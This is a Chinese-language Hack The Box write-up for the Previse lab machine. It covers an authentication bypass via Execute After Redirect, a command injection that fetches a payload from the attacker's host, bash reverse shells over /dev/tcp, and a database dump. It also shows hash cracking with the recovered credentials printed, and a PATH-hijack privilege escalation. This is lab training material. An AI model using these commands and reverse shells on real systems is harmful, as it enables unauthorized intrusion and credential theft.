# Previse Writeup
###### tags: `htb`
> URL : https://app.hackthebox.eu/machines/373
IP : `10.129.212.165`

## Recon
- 掃 Port
    - `rustscan -a 10.129.212.165`
    - 發現有開 22 跟 80
    - ![](https://i.imgur.com/JJ3Fgbs.png)
- 掃目錄
    - `python3 dirsearch.py -u http://10.129.212.165/`
    - ![](https://i.imgur.com/kCLVQCp.png)
    - 基本上沒有什麼有趣的東西
        - 不過有發現有滿多的目錄都會被導到 `login.php`
        - 先事後諸葛的講一下，注意他們的302檔案大小不同
        - 隨便點開幾個沒有關 index of 的目錄
            - ![](https://i.imgur.com/9ypc7Qy.png)
            - ![](https://i.imgur.com/Pk1uGAX.png)
            - 看不出什麼
## 準備 Exploit
- 其實 Recon 玩之後，我就走投無路的卡了兩個小時，途中包含嘗試了 hydra 爆破
    - `hydra -L user.txt -P /opt/rockyou.txt 10.129.212.165 http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed:login.php"`

- 後來發現了他們的 302 大小不同
    - 這叫做 `Execute After Redirect (EAR)` 感謝唉嗚提供!
    - 可以用 Burp 把 Response 也抓包抓起來
        - ![](https://i.imgur.com/XwipB0h.png)
        - 並徒手把 301 的 Redirect 改回 200
- 就可以直接在不登入的狀況下訪問各種目錄了
    - 這算 OWASP TOP 10 的 A2-Broken Authentication
    - ![](https://i.imgur.com/pdEC3vt.png)
    - ![](https://i.imgur.com/ThTYQAd.png)
    - 我們先創一個自己的帳號然後進去亂晃
- 其中在檔案下載的地方，有網頁的原始碼
    - 可以在 `logs.php發現一個明顯的 Command injection 漏洞，但它貌似不會回顯
        - ![](https://i.imgur.com/QdUn7fX.png)
- 使用 Command injection
    - `curl 'http://10.129.212.165/logs.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.129.212.165' -H 'Connection: keep-alive' -H 'Referer: http://10.129.212.165/file_logs.php' -H 'Cookie: PHPSESSID=g5ssm562il8nfcv9fj771ma1nd' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'delim=comma;curl -o /tmp/s 10.10.14.47:8000/s_HTB '`
    - 成功載下了我們的 rever sehell
        - `bash -c 'bash -i >& /dev/tcp/10.10.14.47/7877 0>&1'`
        - ![](https://i.imgur.com/34paVQN.png)
    - 也成功執行起來ㄌ`
curl 'http://10.129.212.165/logs.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.129.212.165' -H 'Connection: keep-alive' -H 'Referer: http://10.129.212.165/file_logs.php' -H 'Cookie: PHPSESSID=g5ssm562il8nfcv9fj771ma1nd' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'delim=comma;bash /tmp/s'` 
    - ![](https://i.imgur.com/YCte2rL.png)

## 一次提權
- 發現我們不能 cat user flag
    - ![](https://i.imgur.com/JYyiOQx.png)
- 觀察 `sudo -l`
    - 我們不能用 sudo 做任何事情
    - ![](https://i.imgur.com/yiiNAXZ.png)
- 從 `config.php` 可以找到資料庫名稱跟密碼
    - ![](https://i.imgur.com/8Y0jBv2.png)
    ```php
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
    ```
- 嘗試把 sql 給 dump 出來
    - `mysqldump -u root -h localhost -p previse > a.sql`
    - ![](https://i.imgur.com/8yfW75r.png)
    - 再載下來
        - `wget 10.129.212.165/a.sql`
        - ![](https://i.imgur.com/Pibp3sV.png)
- 可以觀察到一段帳號跟使用者密馬 hash
    - ![](https://i.imgur.com/WsWuXNF.png)
    - `m4lwhere','$1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.'`
    - 使用 [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)分析
        - ![](https://i.imgur.com/1kx3I9W.png)
        - 發現是 `MD5-Crypt`
    - 而我自己的使用者密碼也在資料庫中，發現到他們的 Salt 一樣
        - ![](https://i.imgur.com/72QlQPu.png)
        - 直接破會發現解不開 QQ
        - ![](https://i.imgur.com/nTmH5uZ.png)
- 觀察原始碼發現它的 salt 是固定的，而且用了 Unicode 的 Emoji
    - ![](https://i.imgur.com/4GmD2ui.png)
    - `$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.`
- 重新修正後就可以用 john 來解ㄌ!
    - ![](https://i.imgur.com/JO0E1mo.png)
- 另外這邊也可以用 Hash Cat 來解
    - `hashcat -m 500 hash.txt rockyou.txt`
    - 可以觀察 Hash cat 的網站，尋找 MD5-Crypt 的代號是 500
        - https://hashcat.net/wiki/doku.php?id=example_hashes
    - ![](https://i.imgur.com/I0M0qIK.png)
- 因此我們就取的了一組帳密
    - `m4lwhere`
    - `ilovecody112235!`
- 也可以順利的 SSH 上去了
    - ![](https://i.imgur.com/UlnFQjt.png)
- 取得 User Flag
    - ![](https://i.imgur.com/ZkPZqFf.png)
    - `aad354dc018b14716dee8310d8f90c03`

## 準備二次提權
- 起手式 `sudo -l`
    - ![](https://i.imgur.com/Ipn20vZ.png)
    - 發現我們可以用 sudo 執行 `access_backup.sh`
    - 但是我們不行對這個檔案進行寫入
        - ![](https://i.imgur.com/2mMRdRt.png)
- 發現程式會呼叫 `date` 的相對位置
    - 所以我們可以用 Path 誤導程式，執行我們的腳本
    - 在本地家目錄創一個 `date` 檔案，設定 x 權限並寫入 Reverse shell
        - `bash -c 'bash -i >& /dev/tcp/10.10.14.47/7878 0>&1'!`
    - 執行 `PATH=/home/m4lwhere:$PATH sudo /opt/scripts/access_backup.sh`
    - 順利取得 Root!!
        - [](https://i.imgur.com/x7l8YDF.png)


![](https://i.imgur.com/I9ANt6M.png)



## 心得
- Execute After Redirect (EAR)
    - 用 dirsearch 除了 Status Code 也需要注意檔案大小
    - 302 跳轉可以先用 curl 檢查
    - Burp 也可以攔截 response 把東西拔掉
- Hash 遇到 Unicode 在 sqldump 或是 cat、less 等狀況 可能會出問題
